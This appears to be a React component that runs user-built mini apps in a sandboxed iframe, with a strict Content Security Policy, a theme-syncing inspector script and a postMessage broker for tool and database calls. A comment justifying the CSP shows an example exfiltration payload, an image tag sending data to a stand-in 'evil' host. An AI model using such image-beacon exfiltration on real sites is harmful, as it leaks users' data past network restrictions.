'use client';

/**
 * Runs a built mini app inside a sandboxed iframe. The app's bundle is fetched
 * (authenticated, same-origin) and INLINED into the iframe's srcdoc, so the
 * iframe runs with an opaque origin (sandbox="allow-scripts", NO
 * allow-same-origin) — it can't read host cookies/DOM/storage. Its only channel
 * is postMessage to this parent, which brokers tool + sqlite calls server-side.
 *
 * Theme parity: we inline the parent's already-compiled CSS and copy the active
 * theme attrs (class + data-color-theme) onto the iframe <html>, so the app
 * matches the product look (incl. dark mode + colour theme) with no network.
 */
import { useCallback, useEffect, useRef, useState } from 'react';
import { isFromApp, type BridgeReq } from '@/lib/app-bridge/protocol';

type Status = 'loading' | 'ready' | 'nobuild' | 'error';

/** Serialize every same-origin stylesheet the host has loaded (Tailwind output
 *  + theme vars). Cross-origin sheets throw on .cssRules — skipped. Cached: the
 *  app's CSS doesn't change within a session. */
/** The shared-runtime import map (specifier → hashed `/app-runtime` URL),
 *  fetched once per session. The app's bundle imports react/react-dom/the kit/
 *  @host as BARE specifiers (the bundler marks them external); this map — injected
 *  into the srcdoc — resolves them to the ONE shared runtime, so the browser
 *  fetches + parses React once across every app + reload instead of each app
 *  re-bundling it. manifest.json is public + same-origin (see middleware). */
let importMapPromise: Promise<string> | null = null;
function loadImportMap(): Promise<string> {
  if (!importMapPromise) {
    importMapPromise = fetch('/app-runtime/manifest.json')
      .then((r) => {
        if (!r.ok) throw new Error(`app-runtime manifest ${r.status}`);
        return r.json() as Promise<{ imports: Record<string, string> }>;
      })
      .then((m) => JSON.stringify({ imports: m.imports }))
      .catch((e) => {
        importMapPromise = null; // let the next mount retry
        throw e;
      });
  }
  return importMapPromise;
}

let cssCache: string | null = null;
function captureHostCss(): string {
  if (cssCache !== null) return cssCache;
  let out = '';
  for (const sheet of Array.from(document.styleSheets)) {
    try {
      for (const rule of Array.from(sheet.cssRules)) out += rule.cssText + '\n';
    } catch {
      /* cross-origin sheet — skip */
    }
  }
  cssCache = out;
  return out;
}

/** The host stylesheet markup to drop into the iframe <head>. We LINK the same
 *  stylesheet files the host already loaded (so the browser reuses its cached,
 *  already-parsed copy instead of re-parsing ~400 KB of inlined CSS per srcdoc)
 *  and inline only the small dynamic <style> tags (theme vars next-themes
 *  injects, etc.). Falls back to a full inline capture when the host exposes no
 *  <link> stylesheets (e.g. some dev setups inline everything). */
function hostStyleMarkup(): string {
  const links = Array.from(document.querySelectorAll<HTMLLinkElement>('link[rel="stylesheet"]'))
    .map((l) => l.href)
    .filter(Boolean);
  if (links.length === 0) return `<style>${captureHostCss()}</style>`;
  const inline = Array.from(document.querySelectorAll('style'))
    .map((s) => s.textContent || '')
    .join('\n');
  const linkTags = links.map((href) => `<link rel="stylesheet" href="${href}" />`).join('\n');
  return `${linkTags}\n<style>${inline}</style>`;
}

// Host-injected "inspect mode" overlay. Lives in the iframe but is NOT part of
// the app bundle, so it works on every app with no rebuild and stays a host
// concern. When the parent posts {kind:'inspect',on:true}, hovering outlines the
// nearest [data-app-region] ancestor and clicking locks it (clicking the same
// one clears it). The locked region is posted back as {kind:'select'}; the
// parent feeds it to Appsmith as focusRegionIds. Esc exits. Pure DOM, defensive.
const INSPECTOR = `
(function(){
  var on=false, locked=null, hovered=null, lbl=null;
  function regionOf(el){
    while(el && el.nodeType===1 && el!==document.body){
      if(el.getAttribute && el.hasAttribute('data-app-region')) return el;
      el=el.parentElement;
    }
    return null;
  }
  function q(id){ try{ return id ? document.querySelector('[data-app-region="'+(window.CSS&&CSS.escape?CSS.escape(id):id)+'"]') : null; }catch(e){ return null; } }
  function label(){
    if(!lbl){
      lbl=document.createElement('div');
      lbl.style.cssText='position:fixed;z-index:2147483647;pointer-events:none;display:none;font:500 11px/1.4 ui-sans-serif,system-ui,sans-serif;padding:2px 6px;border-radius:4px;background:var(--ring,#3b82f6);color:#fff;box-shadow:0 1px 4px rgba(0,0,0,.35);white-space:nowrap;';
      document.body.appendChild(lbl);
    }
    return lbl;
  }
  function paintLocked(){
    var prev=document.querySelectorAll('[data-app-locked]');
    for(var i=0;i<prev.length;i++){ prev[i].removeAttribute('data-app-locked'); prev[i].style.outline=''; prev[i].style.outlineOffset=''; }
    var el=q(locked);
    if(el){ el.setAttribute('data-app-locked','1'); el.style.outline='2px solid var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
  }
  function clearHover(){
    if(hovered && !hovered.hasAttribute('data-app-locked')){ hovered.style.outline=''; hovered.style.outlineOffset=''; }
    hovered=null;
    if(lbl) lbl.style.display='none';
  }
  function onMove(e){
    if(!on) return;
    var el=regionOf(e.target);
    if(el===hovered) return;
    clearHover();
    if(!el) return;
    hovered=el;
    if(!el.hasAttribute('data-app-locked')){ el.style.outline='2px dashed var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
    var r=el.getBoundingClientRect(), L=label();
    L.textContent=el.getAttribute('data-app-region');
    L.style.display='block';
    L.style.left=Math.max(2,r.left)+'px';
    L.style.top=Math.max(2,r.top-20)+'px';
  }
  function onClick(e){
    if(!on) return;
    var el=regionOf(e.target);
    if(!el) return;
    e.preventDefault(); e.stopPropagation(); if(e.stopImmediatePropagation) e.stopImmediatePropagation();
    var id=el.getAttribute('data-app-region');
    locked=(locked===id)?null:id;
    clearHover(); paintLocked();
    window.parent.postMessage({ v:1, kind:'select', regionId:locked, label:locked }, '*');
    onMove(e);
  }
  function setOn(v){ on=v; document.body.style.cursor=v?'crosshair':''; if(!v) clearHover(); }
  window.addEventListener('message', function(e){
    if(e.source!==window.parent) return;
    var m=e.data; if(!m||m.v!==1) return;
    if(m.kind==='inspect'){ setOn(!!m.on); return; }
    if(m.kind==='select'){ locked=m.regionId||null; clearHover(); paintLocked(); return; }
    if(m.kind==='theme'){ var h=document.documentElement; h.className=m.cls||''; if(m.colorTheme){ h.setAttribute('data-color-theme', m.colorTheme); } else { h.removeAttribute('data-color-theme'); } return; }
  });
  document.addEventListener('mousemove', onMove, true);
  document.addEventListener('click', onClick, true);
  document.addEventListener('keydown', function(e){ if(on && e.key==='Escape'){ setOn(false); window.parent.postMessage({v:1,kind:'inspect',on:false},'*'); } });
})();
`;

function buildSrcDoc(bundleCode: string, importMapJson: string): string {
  const html = document.documentElement;
  const cls = html.className || '';
  const colorTheme = html.dataset.colorTheme ? ` data-color-theme="${html.dataset.colorTheme}"` : '';
  const styleMarkup = hostStyleMarkup();
  // CSP: the app may only render — NO network of its own. `connect-src 'none'`
  // blocks fetch/XHR/WebSocket, but img/font loads are network too, so they're
  // held to inline sources only (data:/blob:) — a wildcard there would be an
  // exfil channel (`<img src="https://evil/?d=…">`) despite connect-src 'none'.
  // The app's only egress is the postMessage bridge to the parent, which
  // brokers tool + sqlite calls server-side. Inline style + script are ours.
  //
  // The iframe has an opaque origin, so CSP `'self'` matches NOTHING here; we
  // name the host origin + path explicitly, scoped tight so neither is a general
  // egress channel: `script-src` allows ONLY `<origin>/app-runtime/` (the shared
  // React/kit/host runtime the import map points at); `style-src` allows ONLY
  // `<origin>/_next/` (the host's compiled stylesheet, linked not inlined).
  const origin = location.origin;
  const csp =
    `default-src 'none'; style-src 'unsafe-inline' ${origin}/_next/; ` +
    `script-src 'unsafe-inline' ${origin}/app-runtime/; ` +
    "img-src data: blob:; font-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'";
  return `<!doctype html>
<html class="${cls}"${colorTheme}>
<head>
<meta charset="utf-8" />
<meta http-equiv="Content-Security-Policy" content="${csp}" />
<script type="importmap">${importMapJson}</script>
${styleMarkup}
<style>/* Paint the iframe canvas with the theme background, NOT transparent: a
   sandboxed (opaque-origin) iframe renders WHITE where it's transparent, so any
   gap between the app content and the iframe height showed a white strip. With
   the themed background, any such gap is invisible (matches the app + host). */
html,body{margin:0;background:var(--background)}#root{padding:0}
/* The app is embedded in an auto-sized iframe with no real viewport, so
   viewport-height utilities would inflate it into a tall, mostly-empty box (a
   small app leaves a big blank area below). Collapse them to content height —
   the iframe then hugs the actual content. Belt-and-braces with the authoring
   rule that tells Appsmith not to use these. */
.min-h-screen,.min-h-dvh,.min-h-svh,.min-h-lvh{min-height:0!important}
.h-screen,.h-dvh,.h-svh,.h-lvh{height:auto!important}</style>
</head>
<body class="bg-background text-foreground">
<div id="root"></div>
<script type="module">${bundleCode}</script>
<script>${INSPECTOR}</script>
</body>
</html>`;
}

export function AppSandbox({
  appId,
  shareToken,
  reloadKey = 0,
  onError,
  inspect = false,
  selectedRegionId = null,
  onSelect,
  onInspectChange,
}: {
  appId: string;
  /** When set, render in PUBLIC share mode: the bundle + tool/db brokers are
   *  fetched from /s/<token>/* (token-authed, published build only) instead of
   *  the session-authed /api/apps/<id>/* routes. */
  shareToken?: string;
  /** Bump to force a re-fetch + re-render (e.g. after a build/publish). */
  reloadKey?: number;
  onError?: (message: string) => void;
  /** When true, hovering the preview outlines [data-app-region]s and clicking
   *  one locks it (inspect mode). */
  inspect?: boolean;
  /** The host-held locked selection — pushed down to keep the iframe's outline
   *  in sync (e.g. cleared when the user dismisses the focus chip). */
  selectedRegionId?: string | null;
  /** The user locked or cleared a region in the preview (null = cleared). */
  onSelect?: (regionId: string | null) => void;
  /** The iframe changed inspect state itself (e.g. Esc to exit). */
  onInspectChange?: (on: boolean) => void;
}) {
  // Public share mode swaps the session-authed API base for the token-authed
  // public one; the route suffixes (bundle / tool-broker / db-broker) match.
  const apiBase = shareToken ? `/s/${shareToken}` : `/api/apps/${appId}`;
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [status, setStatus] = useState<Status>('loading');
  const [height, setHeight] = useState(320);

  const postToFrame = useCallback((msg: unknown) => {
    iframeRef.current?.contentWindow?.postMessage(msg, '*');
  }, []);

  // Hold the callbacks in refs so effects can call the latest without listing
  // them as deps. Parents pass inline closures (e.g. onError={(m)=>toast(m)})
  // that change identity every render — without this, typing in the Assist box
  // re-ran the bundle-fetch effect below and reloaded the iframe (white flash).
  const cbRef = useRef({ onError, onSelect, onInspectChange });
  cbRef.current = { onError, onSelect, onInspectChange };

  // Push inspect-mode + the locked selection down whenever they change or the
  // app (re)becomes ready, so a fresh iframe inherits the current state.
  useEffect(() => {
    if (status !== 'ready') return;
    postToFrame({ v: 1, kind: 'inspect', on: inspect });
  }, [inspect, status, postToFrame]);
  useEffect(() => {
    if (status !== 'ready') return;
    postToFrame({ v: 1, kind: 'select', regionId: selectedRegionId });
  }, [selectedRegionId, status, postToFrame]);

  // Mirror the host's live theme (the <html> class + data-color-theme) into the
  // iframe so a dark/light or colour-theme switch restyles a RUNNING app without
  // a reload — the srcdoc only baked in the theme as of mount. Sync once on ready
  // (covers a change between srcdoc build and mount), then on every host change.
  useEffect(() => {
    if (status !== 'ready') return;
    const send = () => {
      const h = document.documentElement;
      postToFrame({ v: 1, kind: 'theme', cls: h.className || '', colorTheme: h.dataset.colorTheme ?? null });
    };
    send();
    const obs = new MutationObserver(send);
    obs.observe(document.documentElement, { attributes: true, attributeFilter: ['class', 'data-color-theme'] });
    return () => obs.disconnect();
  }, [status, postToFrame]);

  // Broker a request from the app and post the correlated response back.
  const handleRequest = useCallback(
    async (req: BridgeReq) => {
      const reply = (res: { ok: boolean; output?: unknown; error?: string }) => {
        iframeRef.current?.contentWindow?.postMessage(
          { v: 1, id: req.id, ...res },
          '*',
        );
      };
      try {
        if (req.kind === 'tool.call') {
          const r = await fetch(`${apiBase}/tool-broker`, {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ slug: req.slug, input: req.input }),
          });
          const data = await r.json();
          // 403 == the slug isn't in the app's declared tools. That's a wiring
          // bug, not a transient failure — surface it plainly to the builder
          // even if the app's own code swallows the rejection.
          if (r.status === 403 && data?.ok === false) {
            cbRef.current.onError?.(
              `This app tried to use the tool “${req.slug}”, which it hasn't declared. ` +
                `Add it to the app's tools (app_tools_set) — or ask Appsmith to — before it can run.`,
            );
          }
          reply(data);
          return;
        }
        // db.query | db.exec
        const op = req.kind === 'db.query' ? 'query' : 'exec';
        const r = await fetch(`${apiBase}/db-broker`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ op, sql: req.sql, params: req.params ?? [] }),
        });
        reply(await r.json());
      } catch (err) {
        reply({ ok: false, error: err instanceof Error ? err.message : String(err) });
      }
    },
    [apiBase],
  );

  // Listen for messages from THIS iframe only.
  useEffect(() => {
    const onMessage = (e: MessageEvent) => {
      if (e.source !== iframeRef.current?.contentWindow) return;
      const m = e.data;
      if (!isFromApp(m)) return;
      if (m.kind === 'ready') {
        setStatus('ready');
        return;
      }
      if (m.kind === 'resize') {
        setHeight(Math.max(80, Math.min(4000, Math.ceil(m.height))));
        return;
      }
      if (m.kind === 'error') {
        cbRef.current.onError?.(m.message);
        return;
      }
      if (m.kind === 'select') {
        cbRef.current.onSelect?.(m.regionId);
        return;
      }
      if (m.kind === 'inspect') {
        cbRef.current.onInspectChange?.(m.on);
        return;
      }
      // A request needing a response.
      void handleRequest(m);
    };
    window.addEventListener('message', onMessage);
    return () => window.removeEventListener('message', onMessage);
  }, [handleRequest]);

  // Fetch the bundle and (re)render into the iframe.
  useEffect(() => {
    let cancelled = false;
    setStatus('loading');
    Promise.all([fetch(`${apiBase}/bundle`), loadImportMap()])
      .then(async ([r, importMap]) => {
        if (cancelled) return;
        if (r.status === 404) {
          setStatus('nobuild');
          return;
        }
        if (!r.ok) {
          setStatus('error');
          cbRef.current.onError?.(`bundle load failed (${r.status})`);
          return;
        }
        const code = await r.text();
        if (cancelled || !iframeRef.current) return;
        iframeRef.current.srcdoc = buildSrcDoc(code, importMap);
      })
      .catch((err) => {
        if (cancelled) return;
        setStatus('error');
        cbRef.current.onError?.(err instanceof Error ? err.message : String(err));
      });
    return () => {
      cancelled = true;
    };
  }, [apiBase, reloadKey]);

  return (
    <div className="relative w-full overflow-hidden rounded-lg border border-border bg-background">
      {status === 'nobuild' && (
        <div className="flex h-40 items-center justify-center p-6 text-center text-sm text-muted-foreground">
          This app hasn&apos;t been built yet. Ask Appsmith to build it, or run a build from the editor.
        </div>
      )}
      {status === 'error' && (
        <div className="flex h-40 items-center justify-center p-6 text-center text-sm text-destructive">
          Couldn&apos;t load the app preview.
        </div>
      )}
      <iframe
        ref={iframeRef}
        title="App preview"
        sandbox="allow-scripts"
        className={status === 'ready' ? 'block w-full' : 'hidden'}
        style={{ height, border: '0', width: '100%' }}
      />
      {status === 'loading' && (
        <div className="flex h-40 items-center justify-center p-6 text-sm text-muted-foreground">
          Loading preview…
        </div>
      )}
    </div>
  );
}
